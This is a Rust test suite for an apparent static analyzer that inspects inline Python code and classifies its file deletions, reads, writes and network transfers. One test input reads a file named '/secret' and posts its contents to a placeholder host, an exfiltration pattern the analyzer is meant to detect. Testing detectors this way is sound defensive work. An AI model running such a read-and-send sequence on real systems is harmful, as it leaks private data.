use nah_inline::{
    InlineInput, LanguageAnalysis, LanguageCallKind, ProtectionInput, analyze_with_language_effects,
};
use nah_proto::{
    action::{FilesystemOperation, InvocationInput},
    ctx::Platform,
};
use serde_json::json;

fn analyze(code: &str) -> LanguageAnalysis {
    analyze_with_language_effects(
        InlineInput {
            program: "python3",
            code,
            home: "/home/dev",
            platform: Platform::Linux,
        },
        ProtectionInput {
            critical_paths: &[],
            ambient_variables: &[],
        },
    )
}

fn native(call: &nah_inline::LanguageCall) -> (&serde_json::Value, bool) {
    let InvocationInput::Native { value, complete } = call.input() else {
        panic!("language calls must use Native input")
    };
    (value, *complete)
}

#[test]
fn direct_file_call_uses_the_frozen_native_contract() {
    let analysis = analyze("import os\nos.remove('/tmp/x')");
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].kind(), LanguageCallKind::DirectFile);
    assert_eq!(
        native(&calls[0]),
        (
            &json!({
                "v": 1,
                "language": "python",
                "callable": "os.remove",
                "positional": [{"kind": "string", "value": "/tmp/x"}],
                "keywords": [],
            }),
            true,
        )
    );
    assert_eq!(calls[0].filesystems().len(), 1);
    assert_eq!(calls[0].filesystems()[0].requested(), Some("/tmp/x"));
    assert_eq!(
        calls[0].filesystems()[0].operation(),
        FilesystemOperation::Delete
    );
    assert!(analysis.draft().complete());
}

#[test]
fn unresolved_known_sink_is_explicit_and_partial() {
    let analysis = analyze("import os\nos.remove(target)");
    let call = &analysis.draft().calls()[0];
    assert_eq!(call.filesystems()[0].requested(), None);
    assert_eq!(
        native(call),
        (
            &json!({
                "v": 1,
                "language": "python",
                "callable": "os.remove",
                "positional": [{"kind": "unknown"}],
                "keywords": [],
            }),
            false,
        )
    );
    assert!(!analysis.draft().complete());
}

#[test]
fn unknown_and_rebound_calls_do_not_invent_effects() {
    assert!(
        analyze("plugin.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
    assert!(
        analyze("import os\nos.remove = lambda path: None\nos.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
}

#[test]
fn known_names_with_non_executable_argument_shapes_do_not_emit() {
    let analysis = analyze(
        "import os, requests\nfrom pathlib import Path\nos.remove()\nos.system()\nrequests.get()\nPath('/tmp/x').write_text()",
    );
    assert!(analysis.draft().calls().is_empty());
}

#[test]
fn exact_dead_branch_emits_no_call_and_unknown_branch_retains_modality() {
    assert!(
        analyze("import os\nif False:\n    os.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
    let analysis = analyze("import os\nif condition:\n    os.remove('/tmp/x')");
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(analysis.draft().calls()[0].conditional_depth(), 1);
    assert!(!analysis.draft().complete());
}

#[test]
fn read_provenance_flows_to_file_and_network_consumers() {
    let analysis = analyze(
        "from pathlib import Path\nimport requests\ndata = Path('/secret').read_text()\nPath('/out').write_text(data)\nrequests.post('https://example.test/x', data=data)",
    );
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 3);
    assert_eq!(
        calls[0].filesystems()[0].operation(),
        FilesystemOperation::Read
    );
    assert_eq!(
        calls[1].filesystems()[0].operation(),
        FilesystemOperation::Write
    );
    assert_eq!(calls[2].kind(), LanguageCallKind::NetworkTransfer);
    assert_eq!(calls[2].endpoint(), Some("https://example.test/x"));
    assert_eq!(
        analysis
            .draft()
            .flows()
            .iter()
            .map(|flow| (flow.from(), flow.to()))
            .collect::<Vec<_>>(),
        vec![(0, 1), (0, 2)]
    );
}

#[test]
fn move_and_link_identity_calls_remain_deferred() {
    let analysis = analyze(
        "import os, shutil\nos.rename('/a', '/b')\nos.link('/a', '/b')\nshutil.move('/a', '/b')",
    );
    assert!(analysis.draft().calls().is_empty());
}

#[test]
fn oversized_collection_becomes_unknown_without_growing_the_contract() {
    let values = (0..65)
        .map(|value| value.to_string())
        .collect::<Vec<_>>()
        .join(",");
    let analysis = analyze(&format!("import subprocess\nsubprocess.run([{values}])"));
    let call = &analysis.draft().calls()[0];
    let (value, complete) = native(call);
    assert_eq!(value["positional"], json!([{"kind": "unknown"}]));
    assert!(!complete);
}
